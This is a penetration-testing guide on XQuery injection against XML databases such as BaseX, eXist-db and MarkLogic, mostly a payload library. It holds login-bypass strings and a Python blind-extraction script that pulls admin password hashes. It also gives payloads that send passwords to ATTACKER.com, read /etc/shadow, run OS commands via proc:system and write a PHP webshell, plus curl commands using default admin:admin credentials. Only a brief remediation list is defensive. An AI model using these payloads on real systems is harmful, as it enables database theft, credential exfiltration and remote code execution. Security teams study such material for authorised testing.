---
title: "XQuery Injection"
date: 2026-02-24
draft: false
---

# XQuery Injection

> **Severity**: High | **CWE**: CWE-652
> **OWASP**: A03:2021 – Injection

---

## What Is XQuery Injection?

XQuery is a functional query language for XML databases (BaseX, eXist-db, MarkLogic, Saxon). Like SQL injection against relational databases, XQuery injection occurs when user input is concatenated directly into an XQuery expression. The impact ranges from data extraction (full XML database dump) to RCE in some implementations that expose XQuery functions like `file:write()`, `proc:system()`, or Java class invocation.

XQuery injection is relatively rare but high impact when present — XML databases are often used for document storage, configuration management, and healthcare/government data systems where the sensitivity is extreme.

```
Vulnerable code (Java):
  String query = "doc('users.xml')//user[username='" + input + "']";
  // input = "admin' or '1'='1
  // Result: doc('users.xml')//user[username='admin' or '1'='1']
  //          → returns all users
```

XQuery vs XPath injection distinction:
- **XPath injection**: operates on a single in-memory XML document; limited to that document
- **XQuery injection**: operates on a full XML database with `doc()`, `collection()`, `fn:doc-available()`, external functions, and file I/O — far broader scope

---

## Discovery Checklist

**Phase 1 — Identify XML Database Usage**
- [ ] Check for error messages containing "XQuery", "BaseX", "eXist", "MarkLogic", "Saxon"
- [ ] Look for response content in XML format with no REST/SOAP envelope
- [ ] Check for `.xq`, `.xqy`, `.xql`, `.xqm` file extensions in URLs or error traces
- [ ] Look for XML-based application frameworks: Cocoon, Orbeon Forms, MarkLogic Application Server
- [ ] Check `Content-Type: application/xml` responses to user-controlled queries

**Phase 2 — Test for Injection**
- [ ] Inject single quote `'` → observe parse error vs. normal response
- [ ] Inject `"` — XQuery supports both delimiters; test both
- [ ] Inject boolean modifier: `' or '1'='1` — observe result set change
- [ ] Inject comment: `(:comment:)` — XQuery comment syntax; if stripped → injection point
- [ ] Test `]` — closes a predicate; if error changes character → injection point

**Phase 3 — Exploit**
- [ ] Boolean-based blind extraction using `starts-with()`, `substring()`, `string-length()`
- [ ] Error-based extraction via type coercion (casting string to integer)
- [ ] OOB exfiltration via `http:send-request()` or Java class invocation
- [ ] RCE via `proc:system()` (BaseX), `file:write()`, or Java reflection

---

## Payload Library

### Payload 1 — Detection and Auth Bypass

```
# Single quote injection — triggers parse error if vulnerable:
username: '
username: "

# Boolean true — bypass login, return all records:
' or '1'='1
" or "1"="1
' or 1=1 or '
') or ('1'='1

# Close predicate + inject new condition:
admin'] | //user[username='admin
admin'] or //user[role='admin

# Comment injection — XQuery block comment:
admin(:injected comment:)
' (:comment:) or '1'='1

# XQuery boolean functions:
' or true() or '
' or boolean(1) or '
' or exists(//user) or '

# Numeric comparison (when field is xs:integer):
1 or 1=1
0 or 1=1
999999 or 1=1

# Example login bypass payloads (concatenated form):
# Vulnerable query: //user[name='INPUT' and password='INPUT']
# Inject into username:
admin' or '1'='1' (:
# → //user[name='admin' or '1'='1' (:' and password='anything']
# Comment swallows the rest → returns user 'admin'

# Double-quote variant:
admin" or "1"="1" (:
```

### Payload 2 — Boolean-Blind Data Extraction

```xquery
(: XQuery boolean oracle — character-by-character extraction :)
(: Inject into a predicate field :)

(: Test if first char of first username is 'a': :)
' or substring(//user[1]/username,1,1)='a' or '1'='0

(: Test document count: :)
' or count(//user) > 5 or '1'='0

(: Extract username length: :)
' or string-length(//user[1]/username) = 5 or '1'='0

(: Extract password hash char by char: :)
' or substring(//user[username='admin']/password,1,1)='a' or '1'='0
' or substring(//user[username='admin']/password,2,1)='b' or '1'='0

(: String comparison for hex chars (MD5/SHA hash extraction): :)
' or starts-with(//user[username='admin']/password,'5f4d') or '1'='0
```

```python
#!/usr/bin/env python3
"""
XQuery boolean-blind extraction oracle
"""
import requests, string, time

TARGET = "https://target.com/api/users/search"
HEADERS = {"Content-Type": "application/x-www-form-urlencoded"}

CHARSET = string.ascii_lowercase + string.digits + string.ascii_uppercase + "!@#$_-."

def probe(payload, true_indicator="found", false_indicator="not found"):
    r = requests.post(TARGET, headers=HEADERS, data={"username": payload}, timeout=10)
    return true_indicator.lower() in r.text.lower()

def extract_string(xquery_expr, max_len=50):
    """Extract a string value from XQuery expression using boolean oracle"""
    result = ""
    for pos in range(1, max_len + 1):
        # First: determine character at this position
        found_char = False
        for char in CHARSET:
            payload = f"' or substring({xquery_expr},{pos},1)='{char}' or '1'='0"
            if probe(payload):
                result += char
                found_char = True
                print(f"  pos {pos}: '{char}' → {result}")
                break
        if not found_char:
            # End of string
            break
        time.sleep(0.1)
    return result

# Extract admin password:
print("[*] Extracting admin username:")
username = extract_string("//user[1]/username")
print(f"Username: {username}")

print("[*] Extracting admin password hash:")
password = extract_string(f"//user[username='{username}']/password")
print(f"Password: {password}")

print("[*] Extracting all document names:")
doc_count_payload = "' or count(fn:collection()) > 0 or '1'='0"
if probe(doc_count_payload):
    print("  Collection exists")
```

### Payload 3 — Error-Based Extraction

```xquery
(: Error-based: cast string to integer → error message contains value :)
(: Works in Saxon, BaseX when errors are verbose :)

(: Trigger error with data in error message: :)
' or //user[1]/username cast as xs:integer or '

(: Using xs:QName for error-based: :)
' or xs:QName(//user[1]/password) or '

(: Saxon-specific: invalid cast reveals value in error: :)
' and (//user[1]/username cast as xs:integer) and '

(: MarkLogic-specific error-based: :)
' or cts:search(doc(), cts:word-query(//user[1]/password)) or '

(: BaseX doc() error — reveals filesystem paths: :)
' or doc('/nonexistent') or '
(: Error: "Document not found: /nonexistent" → confirms filesystem root :)

(: Reveal all collections: :)
' or fn:error(xs:QName('err:XPTY0004'), string(fn:collection())) or '
```

### Payload 4 — OOB Exfiltration

```xquery
(: HTTP-based OOB — eXist-db / BaseX with HTTP module :)
' or http:send-request(<http:request method='GET' href='http://ATTACKER.com/exfil?d={encode-for-uri(//user[1]/password)}'/>)[2] or '

(: BaseX HTTP module: :)
' or http:get('http://ATTACKER.com/?data=' || encode-for-uri(string-join(//user/username, ','))) or '

(: Java invocation for OOB (if Java extensions enabled): :)
' or java:java.net.URL/new('http://ATTACKER.com/?x=' || //user[1]/password)/openConnection()/connect() or '

(: MarkLogic — HTTP call: :)
' or xdmp:http-get('http://ATTACKER.com/?d=' || xdmp:quote(//user[1]/password)) or '
```

```bash
# Test OOB with Burp Collaborator / interactsh:
COLLAB="YOUR.oastify.com"

# Inject into search field:
curl -X POST "https://target.com/api/search" \
  -d "query=%27%20or%20http%3Asend-request(%3Chttp%3Arequest%20method%3D%27GET%27%20href%3D%27http%3A%2F%2F${COLLAB}%2F%3Fdata%3D%7Bencode-for-uri(string-join(%2F%2Fuser%2Fusername%2C%27%2C%27))%7D%27%2F%3E)%5B2%5D%20or%20%271%27%3D%270"

# Monitor interactsh for DNS/HTTP callbacks:
interactsh-client -v
```

### Payload 5 — RCE via XQuery Extension Functions

```xquery
(: BaseX — proc:system() for OS command execution :)
' or proc:system('id') or '
' or proc:system('curl http://ATTACKER.com/?x=$(id|base64)') or '

(: BaseX — file module for file read: :)
' or file:read-text('/etc/passwd') or '
' or string(file:read-text('/etc/shadow')) or '

(: BaseX — file:write() for webshell: :)
' or file:write('/var/www/html/shell.php','<?php system($_GET[c]);?>') or '

(: eXist-db — Java class invocation: :)
(: Requires Java extensions enabled — common in older installs :)
' or java:java.lang.Runtime.getRuntime().exec('id') or '

(: MarkLogic — xdmp:eval() for code injection: :)
' or xdmp:eval('xdmp:http-get("http://ATTACKER.com/?x=" || xdmp:quote(//secrets/key))') or '

(: MarkLogic — xdmp:spawn() for async code exec: :)
' or xdmp:spawn-function(function() { xdmp:http-get("http://ATTACKER.com/rce") }) or '

(: Saxon — dynamic evaluation (if enabled): :)
' or saxon:eval(saxon:expression('proc:system("id")')) or '

(: Read application config (common XQuery target): :)
' or doc('../WEB-INF/web.xml')//param-value[1] or '
' or doc('/db/config/conf.xml')//adminPassword or '
```

### Payload 6 — Collection / Database Enumeration

```xquery
(: List all accessible documents: :)
' or fn:base-uri(collection()[1]) or '

(: List all document URIs: :)
' or string-join(for $d in collection() return fn:base-uri($d), ',') or '

(: Count documents in collection: :)
' or count(collection()) > 10 or '

(: eXist-db — list all collections: :)
' or xmldb:get-child-collections('/db') or '

(: BaseX — list open databases: :)
' or db:list() or '

(: Access a specific named database: :)
' or db:open('production')//credentials/password or '

(: MarkLogic — list all databases: :)
' or xdmp:databases() or '
' or xdmp:database-name(xdmp:databases()[1]) or '
```

---

## Tools

```bash
# xcat — XPath/XQuery injection automation (supports XQuery mode):
pip3 install xcat
xcat run https://target.com/search --query "?search=" \
  --true-string "Result found" --false-string "No results"

# Manual testing with curl — injection in GET parameter:
curl "https://target.com/api/query?username=%27%20or%20%271%27%3D%271"

# BaseX HTTP API (if BaseX is directly exposed on port 8984):
curl "http://TARGET:8984/rest/db?query=%27%20or%20count(collection())%20%3E%200%20or%20%271%27%3D%270"

# eXist-db REST API (port 8080):
curl "http://TARGET:8080/exist/rest/db?_query=%27%20or%20%271%27%3D%271"

# MarkLogic REST API (port 8000):
curl -u admin:admin "http://TARGET:8000/v1/eval" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'xquery=//user/username'

# Detect XQuery engine from error messages:
for payload in "'" '"' "(:test:)" "xs:integer('x')"; do
  r=$(curl -s "https://target.com/search?q=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")")
  echo "Payload: $payload → $(echo $r | head -c 200)"
done

# Burp Suite — use Intruder with XQuery payload list:
# SecLists doesn't have XQuery specific lists — use XPath list as base:
# /usr/share/seclists/Fuzzing/XPath.txt
# Adapt by replacing XPath functions with XQuery equivalents

# If BaseX is exposed (default port 1984 — TCP binary protocol):
# Use BaseX client:
pip3 install pybasex
python3 -c "
from BaseXClient import Session
s = Session('TARGET', 1984, 'admin', 'admin')
print(s.execute('XQUERY //user/password'))
s.close()
"
```

---

## Remediation Reference

- **Parameterized XQuery**: use the database driver's variable binding mechanism — never concatenate user input into XQuery strings; in Java use `XQPreparedExpression` with `bindString()`
- **Input validation**: restrict user input to expected character sets; reject quotes, parentheses, and XQuery keywords at the input layer
- **Principle of least privilege**: the XQuery execution context should only have read access to the documents it needs — disable `proc:`, `file:`, `http:`, and Java extension modules unless required
- **Disable dangerous modules**: in BaseX, disable `proc` and `file` modules; in eXist-db, restrict Java class access; in MarkLogic, restrict `xdmp:eval()` to admin roles
- **Error handling**: never expose XQuery error messages to clients — log server-side, return generic error codes to users
- **WAF rules**: detect XQuery-specific patterns: `or '1'='1`, `fn:doc(`, `collection(`, `(:`, `)` sequences in query parameters

*Part of the Web Application Penetration Testing Methodology series.*
